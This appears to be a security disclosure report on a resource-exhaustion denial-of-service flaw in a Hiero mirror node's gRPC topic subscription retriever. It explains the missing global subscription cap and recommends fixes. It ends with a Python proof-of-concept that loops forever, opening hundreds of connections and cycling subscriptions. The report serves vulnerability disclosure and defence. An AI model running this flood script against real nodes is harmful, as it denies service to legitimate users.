### Title
Unbounded Subscription Resource Exhaustion via Timeout Window Cycling in `PollingTopicMessageRetriever.retrieve()`

### Summary
The `retrieve()` method in `PollingTopicMessageRetriever` creates a per-subscription `PollingContext` that polls the database every 2 seconds for up to 60 seconds (the inactivity timeout). There is no global limit on concurrent subscriptions — only a per-connection cap of 5 — allowing an unprivileged attacker to open arbitrarily many connections and maintain thousands of concurrent polling contexts. By cycling new subscriptions every ~59 seconds, an attacker can sustain a permanent high-load state that exhausts the shared `boundedElastic()` scheduler thread pool and the database connection pool.

### Finding Description

**Exact code path:**

`PollingTopicMessageRetriever.java`, `retrieve()`, lines 45–63:

```java
PollingContext context = new PollingContext(filter, throttled);   // line 50
return Flux.defer(() -> poll(context))
    .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
        .jitter(0.1)
        .withFixedDelay(context.getFrequency())   // 2s default (throttled)
        .withScheduler(scheduler))                // shared boundedElastic
    ...
    .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))  // infinite retry
    .timeout(retrieverProperties.getTimeout(), scheduler)             // 60s inactivity
```

**Root cause — failed assumption:** The design assumes that `maxConcurrentCallsPerConnection = 5` (`NettyProperties.java`, line 14) is a sufficient guard. It is not: this limit is per-TCP-connection, and there is no limit on the number of connections. The `subscriberCount` in `TopicMessageServiceImpl.java` (lines 48, 89–90) is a **metric gauge only** — it is never checked or enforced as a cap before accepting a new subscription.

**Exploit flow:**

1. Attacker opens `C` TCP connections to gRPC port 5600.
2. On each connection, attacker issues 5 concurrent `subscribeTopic` calls with `startTime=0` and no `endTime` or `limit`, targeting a topic with no (or very few) messages.
3. Each call enters `retrieve(filter, true)` (throttled path): `numRepeats = Long.MAX_VALUE` (line 99), `frequency = 2s` (line 100), `maxPageSize = 1000` (line 101).
4. Each `PollingContext` fires `topicMessageRepository.findByFilter()` every 2 seconds via the shared `scheduler = Schedulers.boundedElastic()` (line 41).
5. Because the topic has no messages, no item is emitted, so the 60-second inactivity timeout does not fire until t=60s.
6. At t≈59s, attacker drops and re-opens subscriptions, resetting the timeout window and maintaining `5 * C` active polling contexts indefinitely.

**Why checks fail:**
- `maxConcurrentCallsPerConnection = 5`: bypassed by opening `C` connections; no server-side connection count limit exists.
- `subscriberCount`: read-only metric, never compared against a threshold to reject new subscriptions.
- `TopicMessageFilter` validation (`TopicMessageFilter.java`, lines 43–51): only validates `startTime ≤ now` and `endTime > startTime`; no subscription-rate or concurrency check.
- `retryWhen(Retry.backoff(Long.MAX_VALUE, ...))` (line 58): if DB errors occur under load, each context retries indefinitely, amplifying pressure.

### Impact Explanation

With `C` connections and 5 calls each, the attacker sustains `5C` concurrent polling contexts. Each context issues one DB query every 2 seconds, producing `2.5C` queries/second. The shared `Schedulers.boundedElastic()` scheduler (default cap: `10 × CPU_cores` threads, e.g. 80 on an 8-core node) becomes saturated as contexts queue up. Simultaneously, the database connection pool is exhausted by the flood of `findByFilter` queries. The result is gRPC service degradation or complete unavailability for legitimate subscribers, constituting a denial-of-service against the mirror node's topic subscription processing capacity. With enough connections, this can render 30%+ of mirror node processing capacity unavailable without any brute-force or privileged access.

### Likelihood Explanation

Any unauthenticated client with network access to port 5600 can execute this attack. Opening hundreds of TCP connections and issuing gRPC streaming calls requires only a standard gRPC client library. The cycling pattern (reconnect every 59s) is trivially scriptable. No credentials, tokens, or special knowledge are required. The attack is repeatable and sustainable indefinitely from a single machine or a small botnet.

### Recommendation

1. **Enforce a global concurrent-subscription cap**: In `TopicMessageServiceImpl.subscribeTopic()`, check `subscriberCount` against a configurable maximum before accepting a new subscription and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP connection/subscription rate limiting** at the Netty/gRPC server layer (e.g., via `ServerInterceptor` or a load-balancer policy).
3. **Reduce the inactivity timeout** (`hiero.mirror.grpc.retriever.timeout`) or add a **maximum subscription lifetime** independent of message activity, so idle subscriptions are terminated sooner.
4. **Require a mandatory `endTime`** or enforce a maximum subscription duration for subscriptions with no `limit`, preventing indefinite open-ended polling contexts.
5. **Throttle new subscription creation per source IP** using a token-bucket or sliding-window counter.

### Proof of Concept

```python
import grpc
import threading
import time
# Assumes generated stubs for ConsensusService
from proto import consensus_service_pb2, consensus_service_pb2_grpc, timestamp_pb2

TARGET = "mirror-node-host:5600"
TOPIC_ID = "0.0.12345"   # any valid topic with no/few messages
CONNECTIONS = 200         # 200 connections × 5 calls = 1000 concurrent polling contexts

def flood_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(5):
        def subscribe():
            req = consensus_service_pb2.ConsensusTopicQuery(
                topic_id=...,  # TOPIC_ID
                consensus_start_time=timestamp_pb2.Timestamp(seconds=0, nanos=0)
                # no end_time, no limit
            )
            try:
                for _ in stub.subscribeTopic(req, timeout=59):
                    pass
            except Exception:
                pass
        t = threading.Thread(target=subscribe, daemon=True)
        t.start()
        threads.append(t)
    time.sleep(59)
    channel.close()

while True:
    for _ in range(CONNECTIONS):
        threading.Thread(target=flood_connection, daemon=True).start()
    time.sleep(58)  # cycle before timeout fires
# Result: 1000 concurrent DB polling contexts sustained indefinitely;
# scheduler and DB connection pool exhausted on target node(s).
```
